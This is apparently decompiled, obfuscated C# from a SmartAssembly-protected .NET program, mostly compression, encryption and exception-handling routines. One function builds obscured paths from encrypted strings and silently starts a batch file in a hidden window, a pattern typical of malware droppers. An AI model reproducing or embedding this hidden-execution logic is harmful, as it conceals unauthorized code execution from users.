  static void \u0023hk([In] IWebProxy obj0, [In] \u0023wg obj1) => obj1.\u0023vg = obj0;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ik([In] bool obj0, [In] \u0023qc.\u0023Jd obj1, [In] bool obj2)
  {
    bool flag;
    int num1;
    int zd;
    int yd;
    int num2;
    try
    {
      int num3;
      if (obj1.\u0023Dd < 262)
      {
        if (true)
        {
          num3 = 0;
          goto label_42;
        }
      }
      else
        goto label_47;
label_2:
      \u0023\u0023.\u0023tj(obj1.\u0023Id, (int) obj1.\u0023Hc[obj1.\u0023Cd - 1] & (int) byte.MaxValue);
label_3:
      obj1.\u0023Ad = false;
      \u0023qc.\u0023md id1 = obj1.\u0023Id;
      int num4 = 16;
      goto label_41;
label_10:
      int num5 = 0;
label_11:
      flag = num5 != 0;
      id1 = obj1.\u0023Id;
      byte[] hc = obj1.\u0023Hc;
      int bd = obj1.\u0023Bd;
      \u0023\u0023.\u00238k(hc, num1, id1, flag, bd);
      obj1.\u0023Bd += num1;
      num3 = 5;
      if (true)
        goto label_42;
label_12:
      \u0023\u0023.\u0023tj(obj1.\u0023Id, (int) obj1.\u0023Hc[obj1.\u0023Cd - 1] & (int) byte.MaxValue);
label_13:
      obj1.\u0023Ad = true;
      ++obj1.\u0023Cd;
      --obj1.\u0023Dd;
label_14:
      if (\u0023\u0023.\u0023Di(obj1.\u0023Id))
      {
        num1 = obj1.\u0023Cd - obj1.\u0023Bd;
        if (obj1.\u0023Ad)
          --num1;
        if (obj2)
        {
          num4 = 2;
          goto label_41;
        }
        else
          goto label_10;
      }
      else
        goto label_47;
label_21:
      \u0023qc.\u0023md id2;
      if (zd < 3 || obj1.\u0023zd > zd)
      {
        if (obj1.\u0023Ad)
        {
          num3 = 13;
          goto label_42;
        }
        else
          goto label_13;
      }
      else
      {
        id2 = obj1.\u0023Id;
        if (true)
        {
          num3 = 4;
          goto label_42;
        }
      }
label_23:
      int num6 = obj1.\u0023Cd - 1 - yd;
      \u0023\u0023.\u0023Vk(zd, num6, id2);
      num3 = 1;
      goto label_42;
label_29:
      int num7;
      \u0023\u0023.\u00238k(hc, num7, id1, obj2, bd);
      obj1.\u0023Bd = obj1.\u0023Cd;
      return false;
label_41:
      num3 = num4;
label_42:
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_24;
          case 1:
            goto label_38;
          case 2:
            goto label_8;
          case 3:
            goto label_35;
          case 4:
            goto label_23;
          case 5:
            goto label_46;
          case 6:
            --obj1.\u0023Dd;
            int num8 = 11;
            num3 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num8 : num8;
            continue;
          case 7:
            goto label_29;
          case 8:
          case 10:
            goto label_44;
          case 9:
            goto label_19;
          case 11:
            goto label_4;
          case 12:
          case 13:
            goto label_12;
          case 14:
            goto label_37;
          case 15:
            goto label_2;
          case 16:
            hc = obj1.\u0023Hc;
            num3 = 3;
            continue;
          case 17:
            goto label_49;
          default:
            goto label_43;
        }
      }
label_4:
      obj1.\u0023Ad = false;
      obj1.\u0023zd = 2;
      goto label_14;
label_8:
      if (obj1.\u0023Dd == 0)
      {
        num5 = !obj1.\u0023Ad ? 1 : 0;
        goto label_11;
      }
      else
        goto label_10;
label_19:
      if (obj1.\u0023zd == 3 && obj1.\u0023Cd - obj1.\u0023yd > 4096)
      {
        obj1.\u0023zd = 2;
        goto label_21;
      }
      else
        goto label_21;
label_24:
      if (!obj0)
        return false;
      goto label_47;
label_35:
      bd = obj1.\u0023Bd;
      num7 = obj1.\u0023Cd - obj1.\u0023Bd;
      num4 = 7;
      goto label_41;
label_37:
      ++obj1.\u0023Cd;
      num4 = 6;
      goto label_41;
label_38:
      zd -= 2;
label_39:
      ++obj1.\u0023Cd;
      --obj1.\u0023Dd;
      if (obj1.\u0023Dd >= 3)
      {
        \u0023\u0023.\u00230i(obj1);
        goto label_44;
      }
      else
        goto label_44;
label_43:
      num4 = 10;
      goto label_41;
label_44:
      if (--zd <= 0)
      {
        num4 = 14;
        goto label_41;
      }
      else
        goto label_39;
label_46:
      return !flag;
label_49:
      return true;
label_47:
      if (obj1.\u0023Dd >= 262 || obj0)
      {
        if (obj1.\u0023Dd == 0)
        {
          if (obj1.\u0023Ad)
          {
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num3 = 15;
              goto label_42;
            }
            else
              goto label_29;
          }
          else
            goto label_3;
        }
        else
        {
          if (obj1.\u0023Cd >= 65274)
            \u0023\u0023.\u0023qj(obj1);
          yd = obj1.\u0023yd;
          zd = obj1.\u0023zd;
          if (obj1.\u0023Dd >= 3)
          {
            num2 = \u0023\u0023.\u00230i(obj1);
            if (num2 != 0 && obj1.\u0023Cd - num2 <= 32506 && \u0023\u0023.\u00232k(num2, obj1) && obj1.\u0023zd <= 5)
            {
              int num9 = 9;
              num3 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num9 : num9;
              goto label_42;
            }
            else
              goto label_21;
          }
          else
            goto label_21;
        }
      }
      else
      {
        num4 = 17;
        goto label_41;
      }
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) yd;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) zd;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local5 = (ValueType) flag;
      \u0023qc.\u0023Jd jd = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local6 = (ValueType) obj0;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local7 = (ValueType) obj2;
      \u0023\u0023.\u0023Rk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) jd, (object) local6, (object) local7);
      throw;
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023jk([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023kk([In] \u0023qc.\u0023Pd obj0, [In] int obj1, [In] int obj2)
  {
    int num1;
    int num2;
    try
    {
      obj0.\u0023Nd |= (uint) (obj1 << obj0.\u0023Od);
      int num3 = 4;
      while (true)
      {
        int num4 = num3;
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 4:
              obj0.\u0023Od += obj2;
              if (true)
              {
                num4 = 3;
                continue;
              }
              goto label_7;
            case 1:
            case 2:
              byte[] kd1 = obj0.\u0023Kd;
              num1 = obj0.\u0023Md++;
              int index1 = num1;
              int nd = (int) (byte) obj0.\u0023Nd;
              kd1[index1] = (byte) nd;
              byte[] kd2 = obj0.\u0023Kd;
              num2 = obj0.\u0023Md++;
              int index2 = num2;
              int num5 = (int) (byte) (obj0.\u0023Nd >> 8);
              kd2[index2] = (byte) num5;
              obj0.\u0023Nd >>= 16;
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num4 = 5;
                continue;
              }
              goto case 0;
            case 3:
              if (obj0.\u0023Od < 16)
                goto label_8;
              else
                goto case 1;
            case 5:
              goto label_7;
            default:
              goto label_4;
          }
        }
label_4:
        num3 = 1;
      }
label_8:
      return;
label_7:
      obj0.\u0023Od -= 16;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Pd pd = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) obj2;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) local2, (object) pd, (object) local3, (object) local4);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023lk([In] int obj0, [In] byte[] obj1, [In] \u0023qc.\u0023Pd obj2, [In] int obj3)
  {
    try
    {
      Array.Copy((Array) obj1, obj0, (Array) obj2.\u0023Kd, obj2.\u0023Md, obj3);
      obj2.\u0023Md += obj3;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Pd pd = obj2;
      byte[] numArray = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj3;
      \u0023\u0023.\u0023pl(ex, (object) pd, (object) numArray, (object) local1, (object) local2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023mk(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5)
  {
    \u0023\u0023.\u0023ji(obj0, new object[5]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023nk([In] \u0023hf obj0, [In] bool obj1) => obj0.\u0023ef = obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ok()
  {
label_0:
    int num1;
    int num2;
    string str1;
    string str2;
    string str3;
    ProcessStartInfo startInfo;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        str1 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_2:
        num2 = 3;
        str2 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
label_3:
        num2 = 4;
        str3 = "cm";
label_4:
        num2 = 5;
        if (\u0023\u0023.\u00232h("cmd"))
          goto label_14;
label_5:
        num2 = 6;
        startInfo = new ProcessStartInfo(str1 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
label_6:
        num2 = 7;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
label_7:
        num2 = 8;
        startInfo.CreateNoWindow = true;
label_8:
        num2 = 9;
        Process.Start(startInfo);
        goto label_14;
label_10:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num4 = num3 + 1;
            num3 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
              case 11:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      string str4 = str3;
      string str5 = str1;
      string str6 = str2;
      ProcessStartInfo processStartInfo = startInfo;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      \u0023\u0023.\u00233k(ex, (object) str4, (object) str5, (object) str6, (object) processStartInfo, (object) local1, (object) local2, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023pk([In] \u0023af obj0, [In] \u0023Te obj1)
  {
    int num1 = 5;
    while (true)
    {
      \u0023af af1;
      \u0023af comparand;
      int num2;
      switch (num1)
      {
        case 0:
        case 3:
          if (af1 == comparand)
          {
            num2 = 6;
            break;
          }
          goto case 1;
        case 1:
        case 4:
          comparand = af1;
          num2 = 2;
          break;
        case 2:
          \u0023af af2 = comparand + obj0;
          af1 = Interlocked.CompareExchange<\u0023af>(ref obj1.\u0023Ie, af2, comparand);
          goto case 0;
        case 5:
          af1 = obj1.\u0023Ie;
          num2 = 4;
          break;
        case 6:
          goto label_9;
        default:
          if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
          {
            num1 = 0;
            continue;
          }
          goto case 5;
      }
      num1 = num2;
    }
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023qk([In] int[] obj0, [In] \u0023qc.\u0023md.\u0023Pc obj1)
  {
    int index1;
    int[] numArray1;
    int num1;
    int num2;
    int num3;
    int td;
    int num4;
    int index2;
    int num5;
    int num6;
    int num7;
    int index3;
    int length;
    int index4;
    try
    {
      obj1.\u0023od = new byte[obj1.\u0023nd.Length];
      int num8 = 11;
      if (\u0023\u0023.XPxp2PwLL1BPJh1nWga())
        ;
      while (true)
      {
        int num9;
        switch (num8)
        {
          case 0:
            ++num1;
            goto label_15;
          case 1:
          case 12:
label_23:
            while (num4 > 0)
            {
              index4 = 2 * obj0[num3++];
              if (obj0[index4 + 1] == -1)
              {
                obj1.\u0023od[obj0[index4]] = (byte) td;
                --num4;
                num9 = 12;
                goto label_11;
              }
            }
            num9 = 8;
            goto label_11;
          case 2:
          case 7:
            ++index3;
            goto label_18;
          case 3:
            obj1.\u0023od[obj0[2 * index1]] = (byte) numArray1[index1];
            break;
          case 4:
            obj1.\u0023sd[obj1.\u0023td - 2] -= num1;
            num3 = 2 * num2;
            td = obj1.\u0023td;
            goto case 13;
          case 5:
            if (num1 != 0)
            {
              index2 = obj1.\u0023td - 1;
              goto label_9;
            }
            else
              goto label_36;
          case 6:
          case 9:
label_30:
            do
            {
              --obj1.\u0023sd[index2];
              ++obj1.\u0023sd[++index2];
              num1 -= 1 << obj1.\u0023td - 1 - index2;
            }
            while (num1 > 0 && index2 < obj1.\u0023td - 1);
            if (num1 <= 0)
            {
              obj1.\u0023sd[obj1.\u0023td - 1] += num1;
              num8 = 4;
              continue;
            }
            goto label_9;
          case 8:
            --td;
            num9 = 13;
            goto label_11;
          case 10:
            num1 = 0;
            index3 = 0;
            goto label_18;
          case 11:
            length = obj0.Length / 2;
            num2 = (length + 1) / 2;
            int num10 = 10;
            num8 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num10 : num10;
            continue;
          case 13:
            if (td != 0)
            {
              num4 = obj1.\u0023sd[td - 1];
              num9 = 1;
              goto label_11;
            }
            else
              goto label_34;
          default:
            num9 = 9;
            goto label_11;
        }
label_2:
        --index1;
label_3:
        if (index1 < 0)
        {
          num9 = 5;
          goto label_11;
        }
        else if (obj0[2 * index1 + 1] == -1)
        {
          num7 = numArray1[index1];
          ++obj1.\u0023sd[num7 - 1];
          num9 = 3;
          goto label_11;
        }
        else
        {
          num5 = numArray1[index1] + 1;
          if (num5 > obj1.\u0023td)
          {
            num5 = obj1.\u0023td;
            if (true)
            {
              num8 = 0;
              continue;
            }
            goto label_23;
          }
          else
            goto label_15;
        }
label_9:
        while (obj1.\u0023sd[--index2] == 0)
          ;
        goto label_30;
label_11:
        num8 = num9;
        continue;
label_15:
        int[] numArray2 = numArray1;
        int index5 = obj0[2 * index1];
        numArray1[obj0[2 * index1 + 1]] = num6 = num5;
        int num11 = num6;
        numArray2[index5] = num11;
        goto label_2;
label_18:
        if (index3 >= obj1.\u0023td)
        {
          numArray1 = new int[length];
          numArray1[length - 1] = 0;
          index1 = length - 1;
          goto label_3;
        }
        else
        {
          obj1.\u0023sd[index3] = 0;
          num9 = 7;
          goto label_11;
        }
      }
label_36:
      return;
label_34:;
    }
    catch (Exception ex)
    {
      object[] objArray = new object[16]
      {
        (object) length,
        (object) num2,
        (object) num1,
        (object) index3,
        (object) numArray1,
        (object) index1,
        (object) num5,
        (object) num7,
        (object) index2,
        (object) num3,
        (object) td,
        (object) num4,
        (object) index4,
        (object) num6,
        (object) obj1,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static ICryptoTransform \u0023rk([In] byte[] obj0, [In] bool obj1, [In] byte[] obj2)
  {
    SymmetricAlgorithm symmetricAlgorithm1;
    ICryptoTransform cryptoTransform1;
    try
    {
      symmetricAlgorithm1 = (SymmetricAlgorithm) new RijndaelManaged();
      try
      {
        cryptoTransform1 = obj1 ? symmetricAlgorithm1.CreateDecryptor(obj2, obj0) : symmetricAlgorithm1.CreateEncryptor(obj2, obj0);
      }
      finally
      {
        symmetricAlgorithm1?.Dispose();
      }
      return cryptoTransform1;
    }
    catch (Exception ex)
    {
      SymmetricAlgorithm symmetricAlgorithm2 = symmetricAlgorithm1;
      ICryptoTransform cryptoTransform2 = cryptoTransform1;
      byte[] numArray1 = obj2;
      byte[] numArray2 = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local = (ValueType) obj1;
      \u0023\u0023.\u0023mk(ex, (object) symmetricAlgorithm2, (object) cryptoTransform2, (object) numArray1, (object) numArray2, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023sk([In] object[] obj0, [In] Exception obj1)
  {
    int num = 5;
    if (true)
      goto label_4;
label_1:
    if (\u0023rg.\u0023fg == "1" && \u0023\u0023.\u0023Ik().\u0023ng((SecurityException) obj1))
      return;
label_3:
    \u0023\u0023.\u0023ji(obj1, obj0);
    goto label_6;
label_4:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 5:
          goto label_7;
        case 1:
        case 4:
          goto label_9;
        case 2:
          goto label_1;
        case 3:
          goto label_6;
        case 6:
          goto label_2;
        default:
          num = 3;
          continue;
      }
    }
label_2:
    return;
label_6:
    \u0023\u0023.\u0023Ik().\u0023lf(obj1, false, false);
    if (\u0023\u0023.UBSgn55zIxbZDXest3e())
    {
      num = 6;
      goto label_4;
    }
label_7:
    if (obj1 != null)
    {
      if (\u0023\u0023.UBSgn55zIxbZDXest3e())
      {
        num = 4;
        goto label_4;
      }
    }
    else
      goto label_3;
label_9:
    if (obj1 is SecurityException)
    {
      num = 2;
      goto label_4;
    }
    else
      goto label_3;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023tk([In] \u0023qc.\u0023Cc obj0, [In] \u0023qc.\u0023Mc obj1, [In] int obj2)
  {
    int num1;
    int num2;
    try
    {
      obj2 = Math.Min(Math.Min(obj2, 32768 - obj0.\u0023Oc), \u0023\u0023.\u0023Zi(obj1));
      int num3 = 4;
      if (true)
        goto label_8;
label_1:
      num1 = 32768 - obj0.\u0023Nc;
      if (obj2 > num1)
      {
        num2 = \u0023\u0023.\u0023Ek(obj1, obj0.\u0023Hc, obj0.\u0023Nc, num1);
        if (true)
        {
          num3 = 1;
          goto label_8;
        }
      }
      else
      {
        num2 = \u0023\u0023.\u0023Ek(obj1, obj0.\u0023Hc, obj0.\u0023Nc, obj2);
        goto label_5;
      }
label_3:
      obj0.\u0023Oc += num2;
      num3 = 6;
      goto label_8;
label_5:
      obj0.\u0023Nc = obj0.\u0023Nc + num2 & (int) short.MaxValue;
      num3 = 5;
label_8:
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 2:
            goto label_5;
          case 1:
            goto label_6;
          case 3:
          case 5:
            goto label_3;
          case 4:
            goto label_1;
          case 6:
            goto label_10;
          default:
            num3 = 0;
            continue;
        }
      }
label_6:
      if (num2 == num1)
      {
        num2 += \u0023\u0023.\u0023Ek(obj1, obj0.\u0023Hc, 0, obj2 - num1);
        goto label_5;
      }
      else
        goto label_5;
label_10:
      return num2;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      \u0023qc.\u0023Cc cc = obj0;
      \u0023qc.\u0023Mc mc = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj2;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) local2, (object) cc, (object) mc, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023uk(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5,
    [In] object obj6)
  {
    \u0023\u0023.\u0023ji(obj0, new object[6]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5,
      obj6
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023vk([In] \u0023qc.\u0023Pd obj0)
  {
    try
    {
      return obj0.\u0023Md == 0;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Pd pd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) pd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023wk([In] int obj0, [In] Font obj1, [In] string obj2, [In] Graphics obj3) => Size.Ceiling(obj3.MeasureString(obj2, obj1, obj0)).Height;

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023xk([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023yk([In] \u0023nf obj0) => obj0.\u0023mf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023zk([In] bool obj0, [In] \u0023nf obj1) => obj1.\u0023ff = obj0;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Ak([In] \u0023qc.\u0023Cc obj0, [In] int obj1, [In] int obj2)
  {
    int num1;
    int sourceIndex;
    int num2;
    int num3;
    try
    {
      num1 = (obj0.\u0023Oc += obj1);
      int num4 = 4;
      while (true)
      {
        int num5 = num4;
        while (true)
        {
          switch (num5)
          {
            case 0:
              goto label_1;
            case 1:
            case 3:
              goto label_10;
            case 2:
            case 5:
              goto label_6;
            case 4:
              if (num1 > 32768)
              {
                if (true)
                {
                  num5 = 0;
                  continue;
                }
                goto label_10;
              }
              else
                goto label_2;
            case 6:
              goto label_17;
            default:
              goto label_5;
          }
        }
label_2:
        sourceIndex = obj0.\u0023Nc - obj2 & (int) short.MaxValue;
        num2 = 32768 - obj1;
        if (sourceIndex > num2)
          goto label_15;
        else
          goto label_6;
label_5:
        num4 = 5;
        continue;
label_6:
        if (obj0.\u0023Nc < num2)
        {
          num4 = 1;
          continue;
        }
        goto label_15;
label_10:
        if (obj1 > obj2)
        {
          while (obj1-- > 0)
          {
            byte[] hc = obj0.\u0023Hc;
            num3 = obj0.\u0023Nc++;
            int index = num3;
            int num6 = (int) obj0.\u0023Hc[sourceIndex++];
            hc[index] = (byte) num6;
          }
          num4 = 6;
        }
        else
          goto label_11;
      }
label_1:
      throw new InvalidOperationException();
label_17:
      return;
label_11:
      Array.Copy((Array) obj0.\u0023Hc, sourceIndex, (Array) obj0.\u0023Hc, obj0.\u0023Nc, obj1);
      obj0.\u0023Nc += obj1;
      return;
label_15:
      \u0023\u0023.\u0023dj(obj0, sourceIndex, obj1, obj2);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) sourceIndex;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num3;
      \u0023qc.\u0023Cc cc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) obj2;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) cc, (object) local5, (object) local6);
      throw;
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Bk([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Ck([In] \u0023hf obj0) => obj0.\u0023df && obj0.\u0023he.\u0023Se();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Icon \u0023Dk([In] string obj0)
  {
    try
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + obj0 + ".ico");
      int num = 2;
      if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
        goto label_2;
label_1:
      Icon icon;
      if (manifestResourceStream == null)
      {
        icon = (Icon) null;
        goto label_6;
      }
      else
        goto label_4;
label_2:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          default:
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_4;
        }
      }
label_4:
      icon = new Icon(manifestResourceStream);
label_6:
      return icon;
    }
    catch
    {
      return (Icon) null;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Ek([In] \u0023qc.\u0023Mc obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
  {
    int num1;
    int num2;
    int num3;
    try
    {
      num1 = 0;
label_10:
      if (obj0.\u0023Lc <= 0)
        goto label_7;
      else
        goto label_11;
label_4:
      int num4;
      while (true)
      {
        int num5 = num4;
        while (true)
        {
          switch (num5)
          {
            case 0:
              goto label_7;
            case 1:
            case 3:
              goto label_10;
            case 2:
            case 5:
              goto label_3;
            case 4:
              goto label_12;
            case 6:
              obj0.\u0023Kc >>= 8;
              obj0.\u0023Lc -= 8;
              --obj3;
              ++num1;
              num5 = 3;
              continue;
            case 7:
              goto label_16;
            default:
              goto label_6;
          }
        }
label_3:
        if (obj3 > 0)
        {
          obj1[obj2++] = (byte) obj0.\u0023Kc;
          num4 = 6;
          continue;
        }
        goto label_7;
label_6:
        num4 = 0;
        continue;
label_12:
        if (obj3 > num2)
          obj3 = num2;
        Array.Copy((Array) obj0.\u0023Hc, obj0.\u0023Ic, (Array) obj1, obj2, obj3);
        obj0.\u0023Ic += obj3;
        if ((obj0.\u0023Ic - obj0.\u0023Jc & 1) != 0)
        {
          \u0023qc.\u0023Mc mc = obj0;
          byte[] hc = obj0.\u0023Hc;
          num3 = obj0.\u0023Ic++;
          int index = num3;
          int num6 = (int) hc[index] & (int) byte.MaxValue;
          mc.\u0023Kc = (uint) num6;
          obj0.\u0023Lc = 8;
          num4 = 7;
        }
        else
          break;
      }
label_16:
      return num1 + obj3;
label_7:
      if (obj3 == 0)
        return num1;
      num2 = obj0.\u0023Jc - obj0.\u0023Ic;
      num4 = 4;
      goto label_4;
label_11:
      num4 = 5;
      goto label_4;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num3;
      \u0023qc.\u0023Mc mc = obj0;
      byte[] numArray = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) obj2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) obj3;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) mc, (object) numArray, (object) local4, (object) local5);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Fk([In] \u0023qc.\u0023bd obj0)
  {
    try
    {
      return \u0023\u0023.\u0023ck(obj0.\u0023ad);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023bd bd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) bd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Gk([In] byte[] obj0, [In] bool obj1, [In] int obj2, [In] \u0023qc.\u0023md obj3, [In] int obj4)
  {
    try
    {
      \u0023\u0023.\u0023kk(obj3.\u00239c, obj1 ? 1 : 0, 3);
      int num = 4;
      if (true)
        goto label_4;
label_1:
      \u0023\u0023.\u0023lk(obj2, obj0, obj3.\u00239c, obj4);
      if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
      {
        num = 5;
        goto label_4;
      }
label_2:
      \u0023\u0023.\u0023Qj(obj3.\u00239c);
      \u0023\u0023.\u0023dk(obj3.\u00239c, obj4);
      if (\u0023\u0023.UBSgn55zIxbZDXest3e())
      {
        num = 2;
        goto label_4;
      }
label_3:
      \u0023\u0023.\u0023dk(obj3.\u00239c, ~obj4);
      goto label_1;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            goto label_2;
          case 1:
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 5:
            goto label_6;
          default:
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_6;
        }
      }
label_6:
      \u0023\u0023.\u00237h(obj3);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023md md = obj3;
      byte[] numArray = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) obj2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj4;
      // ISSUE: variable of a boxed type
